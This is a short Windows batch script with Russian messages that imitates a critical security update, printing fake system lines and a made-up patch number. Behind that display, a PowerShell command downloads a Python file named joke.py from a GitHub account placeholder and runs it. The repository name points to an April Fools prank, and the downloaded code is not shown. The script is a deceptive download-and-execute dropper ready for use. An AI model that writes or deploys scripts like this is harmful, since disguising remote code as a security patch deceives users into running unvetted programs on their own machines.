@echo off
echo [SYSTEM] Загрузка критического обновления безопасности...
timeout 3
echo [SYSTEM] Установка патча KB4509102...
timeout 2

powershell -Command "
if (-not (Test-Path '%~dp0joke.py')) {
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ТВОЙ_АККАУНТ/april-fools-joke/main/joke.py' -OutFile '%~dp0joke.py'
}
"

echo [SYSTEM] Запуск системы обновления...
python "%~dp0joke.py"

pause
